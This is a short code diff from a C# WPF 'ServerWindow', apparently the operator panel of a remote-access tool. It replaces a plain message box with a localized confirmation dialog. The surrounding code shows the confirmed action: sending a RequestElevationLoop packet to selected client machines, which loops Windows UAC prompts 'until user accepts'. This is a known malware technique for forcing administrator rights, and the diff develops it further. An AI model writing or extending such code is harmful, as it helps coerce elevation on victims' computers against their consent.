@@ -2739,13 +2739,12 @@ public partial class ServerWindow : ThemedWindow
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
 
-        var result = MessageBox.Show(
-            $"Loop UAC popup on {clients.Count} machine(s) until user accepts?",
-            "Confirm UAC Loop",
-            MessageBoxButton.YesNo,
-            MessageBoxImage.Question);
-
-        if (result != MessageBoxResult.Yes) return;
+        var dlg = new ConfirmDialog(
+            Lang.Get("POPUP_CONFIRM"),
+            string.Format(Lang.Get("POPUP_LOOP_UAC_CONFIRM"), clients.Count),
+            Lang.Get("POPUP_YES"),
+            Lang.Get("POPUP_NO")) { Owner = this };
+        if (dlg.ShowDialog() != true) return;
 
         var packet = new Packet { Type = PacketType.RequestElevationLoop };
         await Task.WhenAll(clients.Select(async c =>
